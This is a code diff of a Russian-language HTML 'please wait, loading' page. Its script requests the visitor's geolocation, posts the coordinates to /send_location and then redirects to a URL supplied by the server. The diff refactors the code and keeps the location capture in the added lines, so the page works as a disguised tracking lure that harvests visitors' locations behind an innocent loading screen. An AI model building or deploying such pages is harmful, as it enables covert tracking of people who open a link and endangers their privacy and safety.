@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Пероход на новую страницу...</title>
+  <title>Переход на новую страницу...</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -20,37 +20,40 @@
 <body>
   <div class="message">Загружаем контент, пожалуйста, подождите...</div>
   <script>
-    let redirectUrl = "https://yandex.ru"; // запасной на всякий случай
+    let redirectUrl = "https://yandex.ru"; // fallback
 
+    // Получаем актуальный URL редиректа
     fetch('/get_redirect')
       .then(res => res.json())
       .then(data => {
-        if (data.redirect_url) redirectUrl = data.redirect_url;
+        if (data.redirect_url) {
+          redirectUrl = data.redirect_url;
+        }
       })
-      .catch(() => {})  // если не получилось — fallback
-
-      .finally(() => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            fetch('/send_location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
-              })
-            });
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 1500);
-          },
-          err => {
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 1500);
-          }
-        );
+      .catch(() => {
+        console.warn("Не удалось получить redirect_url, используем дефолт.");
       });
+
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        fetch('/send_location', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          })
+        });
+        setTimeout(() => {
+          window.location.href = redirectUrl;
+        }, 1500);
+      },
+      err => {
+        setTimeout(() => {
+          window.location.href = redirectUrl;
+        }, 1500);
+      }
+    );
   </script>
 </body>
 </html>
